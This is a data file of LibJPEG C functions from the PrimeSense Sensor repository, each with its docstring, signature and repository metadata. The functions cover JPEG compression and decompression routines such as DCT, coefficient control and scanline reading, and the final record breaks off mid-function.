{"docstring": "/*\n * Process some data in the first pass of 2-pass quantization.\n */\n", "func_signal": "METHODDEF(void)\npost_process_prepass (j_decompress_ptr cinfo,\n\t\t      JSAMPIMAGE input_buf, JDIMENSION *in_row_group_ctr,\n\t\t      JDIMENSION in_row_groups_avail,\n\t\t      JSAMPARRAY output_buf, JDIMENSION *out_row_ctr,\n\t\t      JDIMENSION out_rows_avail)", "code": "{\n  my_post_ptr post = (my_post_ptr) cinfo->post;\n  JDIMENSION old_next_row, num_rows;\n\n  /* Reposition virtual buffer if at start of strip. */\n  if (post->next_row == 0) {\n    post->buffer = (*cinfo->mem->access_virt_sarray)\n\t((j_common_ptr) cinfo, post->whole_image,\n\t post->starting_row, post->strip_height, TRUE);\n  }\n\n  /* Upsample some data (up to a strip height's worth). */\n  old_next_row = post->next_row;\n  (*cinfo->upsample->upsample) (cinfo,\n\t\tinput_buf, in_row_group_ctr, in_row_groups_avail,\n\t\tpost->buffer, &post->next_row, post->strip_height);\n\n  /* Allow quantizer to scan new data.  No data is emitted, */\n  /* but we advance out_row_ctr so outer loop can tell when we're done. */\n  if (post->next_row > old_next_row) {\n    num_rows = post->next_row - old_next_row;\n    (*cinfo->cquantize->color_quantize) (cinfo, post->buffer + old_next_row,\n\t\t\t\t\t (JSAMPARRAY) NULL, (int) num_rows);\n    *out_row_ctr += num_rows;\n  }\n\n  /* Advance if we filled the strip. */\n  if (post->next_row >= post->strip_height) {\n    post->starting_row += post->strip_height;\n    post->next_row = 0;\n  }\n}", "path": "Source\\External\\LibJPEG\\jdpostct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Alternate entry point to read raw data.\n * Processes exactly one iMCU row per call, unless suspended.\n */\n", "func_signal": "GLOBAL(JDIMENSION)\njpeg_read_raw_data (j_decompress_ptr cinfo, JSAMPIMAGE data,\n\t\t    JDIMENSION max_lines)", "code": "{\n  JDIMENSION lines_per_iMCU_row;\n\n  if (cinfo->global_state != DSTATE_RAW_OK)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  if (cinfo->output_scanline >= cinfo->output_height) {\n    WARNMS(cinfo, JWRN_TOO_MUCH_DATA);\n    return 0;\n  }\n\n  /* Call progress monitor hook if present */\n  if (cinfo->progress != NULL) {\n    cinfo->progress->pass_counter = (long) cinfo->output_scanline;\n    cinfo->progress->pass_limit = (long) cinfo->output_height;\n    (*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);\n  }\n\n  /* Verify that at least one iMCU row can be returned. */\n  lines_per_iMCU_row = cinfo->max_v_samp_factor * cinfo->min_DCT_scaled_size;\n  if (max_lines < lines_per_iMCU_row)\n    ERREXIT(cinfo, JERR_BUFFER_SIZE);\n\n  /* Decompress directly into user's buffer. */\n  if (! (*cinfo->coef->decompress_data) (cinfo, data))\n    return 0;\t\t\t/* suspension forced, can do nothing more */\n\n  /* OK, we processed one iMCU row. */\n  cinfo->output_scanline += lines_per_iMCU_row;\n  return lines_per_iMCU_row;\n}", "path": "Source\\External\\LibJPEG\\jdapistd.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Initialize for a processing pass.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_coef (j_compress_ptr cinfo, J_BUF_MODE pass_mode)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n\n  coef->iMCU_row_num = 0;\n  start_iMCU_row(cinfo);\n\n  switch (pass_mode) {\n  case JBUF_PASS_THRU:\n    if (coef->whole_image[0] != NULL)\n      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    coef->pub.compress_data = compress_data;\n    break;\n#ifdef FULL_COEF_BUFFER_SUPPORTED\n  case JBUF_SAVE_AND_PASS:\n    if (coef->whole_image[0] == NULL)\n      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    coef->pub.compress_data = compress_first_pass;\n    break;\n  case JBUF_CRANK_DEST:\n    if (coef->whole_image[0] == NULL)\n      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    coef->pub.compress_data = compress_output;\n    break;\n#endif\n  default:\n    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    break;\n  }\n}", "path": "Source\\External\\LibJPEG\\jccoefct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Write a special marker.\n * This is only recommended for writing COM or APPn markers.\n * Must be called after jpeg_start_compress() and before\n * first call to jpeg_write_scanlines() or jpeg_write_raw_data().\n */\n", "func_signal": "GLOBAL(void)\njpeg_write_marker (j_compress_ptr cinfo, int marker,\n\t\t   const JOCTET *dataptr, unsigned int datalen)", "code": "{\n  JMETHOD(void, write_marker_byte, (j_compress_ptr info, int val));\n\n  if (cinfo->next_scanline != 0 ||\n      (cinfo->global_state != CSTATE_SCANNING &&\n       cinfo->global_state != CSTATE_RAW_OK &&\n       cinfo->global_state != CSTATE_WRCOEFS))\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n\n  (*cinfo->marker->write_marker_header) (cinfo, marker, datalen);\n  write_marker_byte = cinfo->marker->write_marker_byte;\t/* copy for speed */\n  while (datalen--) {\n    (*write_marker_byte) (cinfo, *dataptr);\n    dataptr++;\n  }\n}", "path": "Source\\External\\LibJPEG\\jcapimin.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Finish up after an output pass in buffered-image mode.\n *\n * Returns FALSE if suspended.  The return value need be inspected only if\n * a suspending data source is used.\n */\n", "func_signal": "GLOBAL(boolean)\njpeg_finish_output (j_decompress_ptr cinfo)", "code": "{\n  if ((cinfo->global_state == DSTATE_SCANNING ||\n       cinfo->global_state == DSTATE_RAW_OK) && cinfo->buffered_image) {\n    /* Terminate this pass. */\n    /* We do not require the whole pass to have been completed. */\n    (*cinfo->master->finish_output_pass) (cinfo);\n    cinfo->global_state = DSTATE_BUFPOST;\n  } else if (cinfo->global_state != DSTATE_BUFPOST) {\n    /* BUFPOST = repeat call after a suspension, anything else is error */\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  }\n  /* Read markers looking for SOS or EOI */\n  while (cinfo->input_scan_number <= cinfo->output_scan_number &&\n\t ! cinfo->inputctl->eoi_reached) {\n    if ((*cinfo->inputctl->consume_input) (cinfo) == JPEG_SUSPENDED)\n      return FALSE;\t\t/* Suspend, come back later */\n  }\n  cinfo->global_state = DSTATE_BUFIMAGE;\n  return TRUE;\n}", "path": "Source\\External\\LibJPEG\\jdapistd.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Process some data in the single-pass case.\n * We process the equivalent of one fully interleaved MCU row (\"iMCU\" row)\n * per call, ie, v_samp_factor block rows for each component in the image.\n * Returns TRUE if the iMCU row is completed, FALSE if suspended.\n *\n * NB: input_buf contains a plane for each component in image,\n * which we index according to the component's SOF position.\n */\n", "func_signal": "METHODDEF(boolean)\ncompress_data (j_compress_ptr cinfo, JSAMPIMAGE input_buf)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n  JDIMENSION MCU_col_num;\t/* index of current MCU within row */\n  JDIMENSION last_MCU_col = cinfo->MCUs_per_row - 1;\n  JDIMENSION last_iMCU_row = cinfo->total_iMCU_rows - 1;\n  int blkn, bi, ci, yindex, yoffset, blockcnt;\n  JDIMENSION ypos, xpos;\n  jpeg_component_info *compptr;\n\n  /* Loop to write as much as one whole iMCU row */\n  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;\n       yoffset++) {\n    for (MCU_col_num = coef->mcu_ctr; MCU_col_num <= last_MCU_col;\n\t MCU_col_num++) {\n      /* Determine where data comes from in input_buf and do the DCT thing.\n       * Each call on forward_DCT processes a horizontal row of DCT blocks\n       * as wide as an MCU; we rely on having allocated the MCU_buffer[] blocks\n       * sequentially.  Dummy blocks at the right or bottom edge are filled in\n       * specially.  The data in them does not matter for image reconstruction,\n       * so we fill them with values that will encode to the smallest amount of\n       * data, viz: all zeroes in the AC entries, DC entries equal to previous\n       * block's DC value.  (Thanks to Thomas Kinsman for this idea.)\n       */\n      blkn = 0;\n      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n\tcompptr = cinfo->cur_comp_info[ci];\n\tblockcnt = (MCU_col_num < last_MCU_col) ? compptr->MCU_width\n\t\t\t\t\t\t: compptr->last_col_width;\n\txpos = MCU_col_num * compptr->MCU_sample_width;\n\typos = yoffset * DCTSIZE; /* ypos == (yoffset+yindex) * DCTSIZE */\n\tfor (yindex = 0; yindex < compptr->MCU_height; yindex++) {\n\t  if (coef->iMCU_row_num < last_iMCU_row ||\n\t      yoffset+yindex < compptr->last_row_height) {\n\t    (*cinfo->fdct->forward_DCT) (cinfo, compptr,\n\t\t\t\t\t input_buf[compptr->component_index],\n\t\t\t\t\t coef->MCU_buffer[blkn],\n\t\t\t\t\t ypos, xpos, (JDIMENSION) blockcnt);\n\t    if (blockcnt < compptr->MCU_width) {\n\t      /* Create some dummy blocks at the right edge of the image. */\n\t      jzero_far((void FAR *) coef->MCU_buffer[blkn + blockcnt],\n\t\t\t(compptr->MCU_width - blockcnt) * SIZEOF(JBLOCK));\n\t      for (bi = blockcnt; bi < compptr->MCU_width; bi++) {\n\t\tcoef->MCU_buffer[blkn+bi][0][0] = coef->MCU_buffer[blkn+bi-1][0][0];\n\t      }\n\t    }\n\t  } else {\n\t    /* Create a row of dummy blocks at the bottom of the image. */\n\t    jzero_far((void FAR *) coef->MCU_buffer[blkn],\n\t\t      compptr->MCU_width * SIZEOF(JBLOCK));\n\t    for (bi = 0; bi < compptr->MCU_width; bi++) {\n\t      coef->MCU_buffer[blkn+bi][0][0] = coef->MCU_buffer[blkn-1][0][0];\n\t    }\n\t  }\n\t  blkn += compptr->MCU_width;\n\t  ypos += DCTSIZE;\n\t}\n      }\n      /* Try to write the MCU.  In event of a suspension failure, we will\n       * re-DCT the MCU on restart (a bit inefficient, could be fixed...)\n       */\n      if (! (*cinfo->entropy->encode_mcu) (cinfo, coef->MCU_buffer)) {\n\t/* Suspension forced; update state counters and exit */\n\tcoef->MCU_vert_offset = yoffset;\n\tcoef->mcu_ctr = MCU_col_num;\n\treturn FALSE;\n      }\n    }\n    /* Completed an MCU row, but perhaps not an iMCU row */\n    coef->mcu_ctr = 0;\n  }\n  /* Completed the iMCU row, advance counters for next one */\n  coef->iMCU_row_num++;\n  start_iMCU_row(cinfo);\n  return TRUE;\n}", "path": "Source\\External\\LibJPEG\\jccoefct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Process some data in the one-pass (strip buffer) case.\n * This is used for color precision reduction as well as one-pass quantization.\n */\n", "func_signal": "METHODDEF(void)\npost_process_1pass (j_decompress_ptr cinfo,\n\t\t    JSAMPIMAGE input_buf, JDIMENSION *in_row_group_ctr,\n\t\t    JDIMENSION in_row_groups_avail,\n\t\t    JSAMPARRAY output_buf, JDIMENSION *out_row_ctr,\n\t\t    JDIMENSION out_rows_avail)", "code": "{\n  my_post_ptr post = (my_post_ptr) cinfo->post;\n  JDIMENSION num_rows, max_rows;\n\n  /* Fill the buffer, but not more than what we can dump out in one go. */\n  /* Note we rely on the upsampler to detect bottom of image. */\n  max_rows = out_rows_avail - *out_row_ctr;\n  if (max_rows > post->strip_height)\n    max_rows = post->strip_height;\n  num_rows = 0;\n  (*cinfo->upsample->upsample) (cinfo,\n\t\tinput_buf, in_row_group_ctr, in_row_groups_avail,\n\t\tpost->buffer, &num_rows, max_rows);\n  /* Quantize and emit data. */\n  (*cinfo->cquantize->color_quantize) (cinfo,\n\t\tpost->buffer, output_buf + *out_row_ctr, (int) num_rows);\n  *out_row_ctr += num_rows;\n}", "path": "Source\\External\\LibJPEG\\jdpostct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/* Same, but piecemeal. */\n", "func_signal": "GLOBAL(void)\njpeg_write_m_header (j_compress_ptr cinfo, int marker, unsigned int datalen)", "code": "{\n  if (cinfo->next_scanline != 0 ||\n      (cinfo->global_state != CSTATE_SCANNING &&\n       cinfo->global_state != CSTATE_RAW_OK &&\n       cinfo->global_state != CSTATE_WRCOEFS))\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n\n  (*cinfo->marker->write_marker_header) (cinfo, marker, datalen);\n}", "path": "Source\\External\\LibJPEG\\jcapimin.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Read some scanlines of data from the JPEG decompressor.\n *\n * The return value will be the number of lines actually read.\n * This may be less than the number requested in several cases,\n * including bottom of image, data source suspension, and operating\n * modes that emit multiple scanlines at a time.\n *\n * Note: we warn about excess calls to jpeg_read_scanlines() since\n * this likely signals an application programmer error.  However,\n * an oversize buffer (max_lines > scanlines remaining) is not an error.\n */\n", "func_signal": "GLOBAL(JDIMENSION)\njpeg_read_scanlines (j_decompress_ptr cinfo, JSAMPARRAY scanlines,\n\t\t     JDIMENSION max_lines)", "code": "{\n  JDIMENSION row_ctr;\n\n  if (cinfo->global_state != DSTATE_SCANNING)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  if (cinfo->output_scanline >= cinfo->output_height) {\n    WARNMS(cinfo, JWRN_TOO_MUCH_DATA);\n    return 0;\n  }\n\n  /* Call progress monitor hook if present */\n  if (cinfo->progress != NULL) {\n    cinfo->progress->pass_counter = (long) cinfo->output_scanline;\n    cinfo->progress->pass_limit = (long) cinfo->output_height;\n    (*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);\n  }\n\n  /* Process some data */\n  row_ctr = 0;\n  (*cinfo->main->process_data) (cinfo, scanlines, &row_ctr, max_lines);\n  cinfo->output_scanline += row_ctr;\n  return row_ctr;\n}", "path": "Source\\External\\LibJPEG\\jdapistd.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Finish JPEG compression.\n *\n * If a multipass operating mode was selected, this may do a great deal of\n * work including most of the actual output.\n */\n", "func_signal": "GLOBAL(void)\njpeg_finish_compress (j_compress_ptr cinfo)", "code": "{\n  JDIMENSION iMCU_row;\n\n  if (cinfo->global_state == CSTATE_SCANNING ||\n      cinfo->global_state == CSTATE_RAW_OK) {\n    /* Terminate first pass */\n    if (cinfo->next_scanline < cinfo->image_height)\n      ERREXIT(cinfo, JERR_TOO_LITTLE_DATA);\n    (*cinfo->master->finish_pass) (cinfo);\n  } else if (cinfo->global_state != CSTATE_WRCOEFS)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  /* Perform any remaining passes */\n  while (! cinfo->master->is_last_pass) {\n    (*cinfo->master->prepare_for_pass) (cinfo);\n    for (iMCU_row = 0; iMCU_row < cinfo->total_iMCU_rows; iMCU_row++) {\n      if (cinfo->progress != NULL) {\n\tcinfo->progress->pass_counter = (long) iMCU_row;\n\tcinfo->progress->pass_limit = (long) cinfo->total_iMCU_rows;\n\t(*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);\n      }\n      /* We bypass the main controller and invoke coef controller directly;\n       * all work is being done from the coefficient buffer.\n       */\n      if (! (*cinfo->coef->compress_data) (cinfo, (JSAMPIMAGE) NULL))\n\tERREXIT(cinfo, JERR_CANT_SUSPEND);\n    }\n    (*cinfo->master->finish_pass) (cinfo);\n  }\n  /* Write EOI, do final cleanup */\n  (*cinfo->marker->write_file_trailer) (cinfo);\n  (*cinfo->dest->term_destination) (cinfo);\n  /* We can use jpeg_abort to release memory and reset global_state */\n  jpeg_abort((j_common_ptr) cinfo);\n}", "path": "Source\\External\\LibJPEG\\jcapimin.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_ifast (j_decompress_ptr cinfo, jpeg_component_info * compptr,\n\t\t JCOEFPTR coef_block,\n\t\t JSAMPARRAY output_buf, JDIMENSION output_col)", "code": "{\n  DCTELEM tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;\n  DCTELEM tmp10, tmp11, tmp12, tmp13;\n  DCTELEM z5, z10, z11, z12, z13;\n  JCOEFPTR inptr;\n  IFAST_MULT_TYPE * quantptr;\n  int * wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[DCTSIZE2];\t/* buffers data between passes */\n  SHIFT_TEMPS\t\t\t/* for DESCALE */\n  ISHIFT_TEMPS\t\t\t/* for IDESCALE */\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (IFAST_MULT_TYPE *) compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = DCTSIZE; ctr > 0; ctr--) {\n    /* Due to quantization, we will usually find that many of the input\n     * coefficients are zero, especially the AC terms.  We can exploit this\n     * by short-circuiting the IDCT calculation for any column in which all\n     * the AC terms are zero.  In that case each output is equal to the\n     * DC coefficient (with scale factor as needed).\n     * With typical images and quantization tables, half or more of the\n     * column DCT calculations can be simplified this way.\n     */\n    \n    if (inptr[DCTSIZE*1] == 0 && inptr[DCTSIZE*2] == 0 &&\n\tinptr[DCTSIZE*3] == 0 && inptr[DCTSIZE*4] == 0 &&\n\tinptr[DCTSIZE*5] == 0 && inptr[DCTSIZE*6] == 0 &&\n\tinptr[DCTSIZE*7] == 0) {\n      /* AC terms all zero */\n      int dcval = (int) DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n\n      wsptr[DCTSIZE*0] = dcval;\n      wsptr[DCTSIZE*1] = dcval;\n      wsptr[DCTSIZE*2] = dcval;\n      wsptr[DCTSIZE*3] = dcval;\n      wsptr[DCTSIZE*4] = dcval;\n      wsptr[DCTSIZE*5] = dcval;\n      wsptr[DCTSIZE*6] = dcval;\n      wsptr[DCTSIZE*7] = dcval;\n      \n      inptr++;\t\t\t/* advance pointers to next column */\n      quantptr++;\n      wsptr++;\n      continue;\n    }\n    \n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n    tmp1 = DEQUANTIZE(inptr[DCTSIZE*2], quantptr[DCTSIZE*2]);\n    tmp2 = DEQUANTIZE(inptr[DCTSIZE*4], quantptr[DCTSIZE*4]);\n    tmp3 = DEQUANTIZE(inptr[DCTSIZE*6], quantptr[DCTSIZE*6]);\n\n    tmp10 = tmp0 + tmp2;\t/* phase 3 */\n    tmp11 = tmp0 - tmp2;\n\n    tmp13 = tmp1 + tmp3;\t/* phases 5-3 */\n    tmp12 = MULTIPLY(tmp1 - tmp3, FIX_1_414213562) - tmp13; /* 2*c4 */\n\n    tmp0 = tmp10 + tmp13;\t/* phase 2 */\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n    \n    /* Odd part */\n\n    tmp4 = DEQUANTIZE(inptr[DCTSIZE*1], quantptr[DCTSIZE*1]);\n    tmp5 = DEQUANTIZE(inptr[DCTSIZE*3], quantptr[DCTSIZE*3]);\n    tmp6 = DEQUANTIZE(inptr[DCTSIZE*5], quantptr[DCTSIZE*5]);\n    tmp7 = DEQUANTIZE(inptr[DCTSIZE*7], quantptr[DCTSIZE*7]);\n\n    z13 = tmp6 + tmp5;\t\t/* phase 6 */\n    z10 = tmp6 - tmp5;\n    z11 = tmp4 + tmp7;\n    z12 = tmp4 - tmp7;\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = MULTIPLY(z11 - z13, FIX_1_414213562); /* 2*c4 */\n\n    z5 = MULTIPLY(z10 + z12, FIX_1_847759065); /* 2*c2 */\n    tmp10 = MULTIPLY(z12, FIX_1_082392200) - z5; /* 2*(c2-c6) */\n    tmp12 = MULTIPLY(z10, - FIX_2_613125930) + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    wsptr[DCTSIZE*0] = (int) (tmp0 + tmp7);\n    wsptr[DCTSIZE*7] = (int) (tmp0 - tmp7);\n    wsptr[DCTSIZE*1] = (int) (tmp1 + tmp6);\n    wsptr[DCTSIZE*6] = (int) (tmp1 - tmp6);\n    wsptr[DCTSIZE*2] = (int) (tmp2 + tmp5);\n    wsptr[DCTSIZE*5] = (int) (tmp2 - tmp5);\n    wsptr[DCTSIZE*4] = (int) (tmp3 + tmp4);\n    wsptr[DCTSIZE*3] = (int) (tmp3 - tmp4);\n\n    inptr++;\t\t\t/* advance pointers to next column */\n    quantptr++;\n    wsptr++;\n  }\n  \n  /* Pass 2: process rows from work array, store into output array. */\n  /* Note that we must descale the results by a factor of 8 == 2**3, */\n  /* and also undo the PASS1_BITS scaling. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < DCTSIZE; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n    /* Rows of zeroes can be exploited in the same way as we did with columns.\n     * However, the column calculation has created many nonzero AC terms, so\n     * the simplification applies less often (typically 5% to 10% of the time).\n     * On machines with very fast multiplication, it's possible that the\n     * test takes more time than it's worth.  In that case this section\n     * may be commented out.\n     */\n    \n#ifndef NO_ZERO_ROW_TEST\n    if (wsptr[1] == 0 && wsptr[2] == 0 && wsptr[3] == 0 && wsptr[4] == 0 &&\n\twsptr[5] == 0 && wsptr[6] == 0 && wsptr[7] == 0) {\n      /* AC terms all zero */\n      JSAMPLE dcval = range_limit[IDESCALE(wsptr[0], PASS1_BITS+3)\n\t\t\t\t  & RANGE_MASK];\n      \n      outptr[0] = dcval;\n      outptr[1] = dcval;\n      outptr[2] = dcval;\n      outptr[3] = dcval;\n      outptr[4] = dcval;\n      outptr[5] = dcval;\n      outptr[6] = dcval;\n      outptr[7] = dcval;\n\n      wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n      continue;\n    }\n#endif\n    \n    /* Even part */\n\n    tmp10 = ((DCTELEM) wsptr[0] + (DCTELEM) wsptr[4]);\n    tmp11 = ((DCTELEM) wsptr[0] - (DCTELEM) wsptr[4]);\n\n    tmp13 = ((DCTELEM) wsptr[2] + (DCTELEM) wsptr[6]);\n    tmp12 = MULTIPLY((DCTELEM) wsptr[2] - (DCTELEM) wsptr[6], FIX_1_414213562)\n\t    - tmp13;\n\n    tmp0 = tmp10 + tmp13;\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n\n    /* Odd part */\n\n    z13 = (DCTELEM) wsptr[5] + (DCTELEM) wsptr[3];\n    z10 = (DCTELEM) wsptr[5] - (DCTELEM) wsptr[3];\n    z11 = (DCTELEM) wsptr[1] + (DCTELEM) wsptr[7];\n    z12 = (DCTELEM) wsptr[1] - (DCTELEM) wsptr[7];\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = MULTIPLY(z11 - z13, FIX_1_414213562); /* 2*c4 */\n\n    z5 = MULTIPLY(z10 + z12, FIX_1_847759065); /* 2*c2 */\n    tmp10 = MULTIPLY(z12, FIX_1_082392200) - z5; /* 2*(c2-c6) */\n    tmp12 = MULTIPLY(z10, - FIX_2_613125930) + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    /* Final output stage: scale down by a factor of 8 and range-limit */\n\n    outptr[0] = range_limit[IDESCALE(tmp0 + tmp7, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[7] = range_limit[IDESCALE(tmp0 - tmp7, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[1] = range_limit[IDESCALE(tmp1 + tmp6, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[6] = range_limit[IDESCALE(tmp1 - tmp6, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[2] = range_limit[IDESCALE(tmp2 + tmp5, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[5] = range_limit[IDESCALE(tmp2 - tmp5, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[4] = range_limit[IDESCALE(tmp3 + tmp4, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[3] = range_limit[IDESCALE(tmp3 - tmp4, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n\n    wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n}", "path": "Source\\External\\LibJPEG\\jidctfst.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Initialize for a processing pass.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_dpost (j_decompress_ptr cinfo, J_BUF_MODE pass_mode)", "code": "{\n  my_post_ptr post = (my_post_ptr) cinfo->post;\n\n  switch (pass_mode) {\n  case JBUF_PASS_THRU:\n    if (cinfo->quantize_colors) {\n      /* Single-pass processing with color quantization. */\n      post->pub.post_process_data = post_process_1pass;\n      /* We could be doing buffered-image output before starting a 2-pass\n       * color quantization; in that case, jinit_d_post_controller did not\n       * allocate a strip buffer.  Use the virtual-array buffer as workspace.\n       */\n      if (post->buffer == NULL) {\n\tpost->buffer = (*cinfo->mem->access_virt_sarray)\n\t  ((j_common_ptr) cinfo, post->whole_image,\n\t   (JDIMENSION) 0, post->strip_height, TRUE);\n      }\n    } else {\n      /* For single-pass processing without color quantization,\n       * I have no work to do; just call the upsampler directly.\n       */\n      post->pub.post_process_data = cinfo->upsample->upsample;\n    }\n    break;\n#ifdef QUANT_2PASS_SUPPORTED\n  case JBUF_SAVE_AND_PASS:\n    /* First pass of 2-pass quantization */\n    if (post->whole_image == NULL)\n      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    post->pub.post_process_data = post_process_prepass;\n    break;\n  case JBUF_CRANK_DEST:\n    /* Second pass of 2-pass quantization */\n    if (post->whole_image == NULL)\n      ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    post->pub.post_process_data = post_process_2pass;\n    break;\n#endif /* QUANT_2PASS_SUPPORTED */\n  default:\n    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n    break;\n  }\n  post->starting_row = post->next_row = 0;\n}", "path": "Source\\External\\LibJPEG\\jdpostct.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Forcibly suppress or un-suppress all quantization and Huffman tables.\n * Marks all currently defined tables as already written (if suppress)\n * or not written (if !suppress).  This will control whether they get emitted\n * by a subsequent jpeg_start_compress call.\n *\n * This routine is exported for use by applications that want to produce\n * abbreviated JPEG datastreams.  It logically belongs in jcparam.c, but\n * since it is called by jpeg_start_compress, we put it here --- otherwise\n * jcparam.o would be linked whether the application used it or not.\n */\n", "func_signal": "GLOBAL(void)\njpeg_suppress_tables (j_compress_ptr cinfo, boolean suppress)", "code": "{\n  int i;\n  JQUANT_TBL * qtbl;\n  JHUFF_TBL * htbl;\n\n  for (i = 0; i < NUM_QUANT_TBLS; i++) {\n    if ((qtbl = cinfo->quant_tbl_ptrs[i]) != NULL)\n      qtbl->sent_table = suppress;\n  }\n\n  for (i = 0; i < NUM_HUFF_TBLS; i++) {\n    if ((htbl = cinfo->dc_huff_tbl_ptrs[i]) != NULL)\n      htbl->sent_table = suppress;\n    if ((htbl = cinfo->ac_huff_tbl_ptrs[i]) != NULL)\n      htbl->sent_table = suppress;\n  }\n}", "path": "Source\\External\\LibJPEG\\jcapimin.c", "repo_name": "PrimeSense/Sensor", "stars": 381, "license": "apache-2.0", "language": "c", "size": 4962}
{"docstring": "/*\n * Perform the forward DCT on one block of samples.\n */\n", "func_signal": "GLOBAL(void)\njpeg_fdct_islow (DCTELEM * data)", "code": "{\n  INT32 tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;\n  INT32 tmp10, tmp11, tmp12, tmp13;\n  INT32 z1, z2, z3, z4, z5;\n  DCTELEM *dataptr;\n  int ctr;\n  SHIFT_TEMPS\n\n  /* Pass 1: process rows. */\n  /* Note results are scaled up by sqrt(8) compared to a true DCT; */\n  /* furthermore, we scale the results by 2**PASS1_BITS. */\n\n  dataptr = data;\n  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {\n    tmp0 = dataptr[0] + dataptr[7];\n    tmp7 = dataptr[0] - dataptr[7];\n    tmp1 = dataptr[1] + dataptr[6];\n    tmp6 = dataptr[1] - dataptr[6];\n    tmp2 = dataptr[2] + dataptr[5];\n    tmp5 = dataptr[2] - dataptr[5];\n    tmp3 = dataptr[3] + dataptr[4];\n    tmp4 = dataptr[3] - dataptr[4];\n    \n    /* Even part per LL&M figure 1 --- note that published figure is faulty;\n     * rotator \"sqrt(2)*c1\" should be \"sqrt(2)*c6\".\n     */\n    \n    tmp10 = tmp0 + tmp3;\n    tmp13 = tmp0 - tmp3;\n    tmp11 = tmp1 + tmp2;\n    tmp12 = tmp1 - tmp2;\n    \n    dataptr[0] = (DCTELEM) ((tmp10 + tmp11) << PASS1_BITS);\n    dataptr[4] = 